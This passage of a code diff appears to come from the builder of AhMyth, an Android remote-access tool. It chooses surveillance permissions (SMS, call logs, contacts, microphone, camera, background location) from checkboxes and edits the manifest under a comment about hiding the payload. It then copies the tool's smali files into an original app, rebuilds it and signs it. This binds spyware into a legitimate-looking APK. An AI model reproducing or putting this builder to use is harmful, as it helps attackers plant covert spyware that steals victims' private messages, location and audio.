+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+                //hide payload by editing AndroidManifest.xml
+            fs.readFile(path.join(CONSTANTS.ahmythApkFolderPath, "AndroidManifest.xml"), 'utf8', (err,data) => {
+                var defaultper = `    <uses-feature android:name="android.hardware.camera"/>
+    <uses-feature android:name="android.hardware.camera.autofocus"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.CAMERA"/>
+    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+    <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="android.permission.WRITE_SMS"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+    <uses-permission android:name="android.permission.READ_CONTACTS"/>
+    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+    <uses-permission android:name="android.permission.BACKGROUND_SERVICE"/>
+    <uses-permission android:name="android.permission.ACCESS_SUPERUSER"/>`
+                var formatted2 = data.replace(defaultper, Permissionsrules);
+            fs.writeFile(path.join(CONSTANTS.ahmythApkFolderPath, "AndroidManifest.xml"), formatted2, 'utf8', (err) => {
+                if (err) {
+                    $appCtrl.Log('Hiding in AndroidManifest.xml Failed', CONSTANTS.logStatus.FAIL);
+                    return;
+                }
+                })
+        })
+        $appCtrl.Log('Building ' + CONSTANTS.apkName + '...');
+        var createApk = exec('java -jar "' + CONSTANTS.apktoolJar + '" b "' + apkFolder + '" -o "' + path.join(outputPath, CONSTANTS.apkName) + '" --use-aapt "' + '"',
+            (error, stdout, stderr) => {
+                if (error !== null) {
+                    $appCtrl.Log('Building Failed', CONSTANTS.logStatus.FAIL);
+                    return;
+                }
+
+                $appCtrl.Log('Signing ' + CONSTANTS.apkName + '...');
+                var signApk = exec('java -jar "' + CONSTANTS.signApkJar + '" -a "' + path.join(outputPath, CONSTANTS.apkName) + '"',
+                    (error, stdout, stderr) => {
+                        if (error !== null) {
+                            $appCtrl.Log('Signing Failed', CONSTANTS.logStatus.FAIL);
+                            return;
+                        }
+
+
+                        fs.unlink(path.join(outputPath, CONSTANTS.apkName), (err) => {
+                            if (err) throw err;
+
+                            $appCtrl.Log('Apk built successfully', CONSTANTS.logStatus.SUCCESS);
+                            $appCtrl.Log("The apk has been built on " + path.join(outputPath, CONSTANTS.signedApkName), CONSTANTS.logStatus.SUCCESS);
+                            exec("cd app/app/Factory/Ahmyth/ && rm -rf AndroidManifest.xml && cd .. && cp Vault/AndroidManifest.xml.ahmyth Ahmyth/AndroidManifest.xml ")
+                        });
+                    });
+            });
+
+    }
+
+    // function to copy ahmyth source files to the orginal app
+    // and if success go to generate the apk
+    $appCtrl.CopyAhmythFilesAndGenerateApk = (apkFolder) => {
+
+        $appCtrl.Log("Copying Ahmyth files to orginal app...");
+        fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), path.join(apkFolder, "smali"), (error) => {
+            if (error) {
+                $appCtrl.Log('Copying Failed', CONSTANTS.logStatus.FAIL);
+                return;
+            }
+
+            $appCtrl.GenerateApk(apkFolder);
+        })
+
+    };
+
+
+    // function to copy all the ahmyth permissions to the orginal app
     $appCtrl.copyPermissions = (manifest) => {
-      var firstPart = manifest.substring(0, manifest.indexOf("<application"));
-      var lastPart = manifest.substring(manifest.indexOf("<application"));
+        var firstPart = manifest.substring(0, manifest.indexOf("<application"));
+        var lastPart = manifest.substring(manifest.indexOf("<application"));
+        var checkBoxofCamera = document.getElementById("Permissions1");
+        var checkBoxofStorage = document.getElementById("Permissions2");
+        var checkBoxofMic = document.getElementById("Permissions3");
+        var checkBoxofLocation = document.getElementById("Permissions4");
+        var checkBoxofContacts = document.getElementById("Permissions5");
+        var checkBoxofSms = document.getElementById("Permissions6"); 
+        var checkBoxofCallsLogs = document.getElementById("Permissions7");
+        //if all unchecked
+        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var permArray = CONSTANTS.permissions
+        }
+        //if all checked
+        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var permArray = CONSTANTS.permissions
+        }
+        //if only one selected
+        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>            
+   `
+        }
+        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>           
+   ` 
+        }
+        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>        
+   ` 
+        }
+        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>       
+   ` 
+        }
+        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>` 
+        }        
 
-      var permArray = CONSTANTS.permissions;
-      for (var i = 0; i < permArray.length; i++) {
-          var permissionName = permArray[i].substring(permArray[i].indexOf('name="') + 6);
-          permissionName = permissionName.substring(0, permissionName.indexOf('"'));
-          if (firstPart.indexOf(permissionName) == -1) {
-              firstPart = firstPart + "\n" + permArray[i];
-          }
-      }
+        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>`       
+        }        
+        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>   
+           ` 
+        }  
+        //if six checked
+        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>  
+           ` 
+        }  
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>`            
+        }  
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>          `  }  
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }  
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+        //if two are checked 
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>        ` 
+        }
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
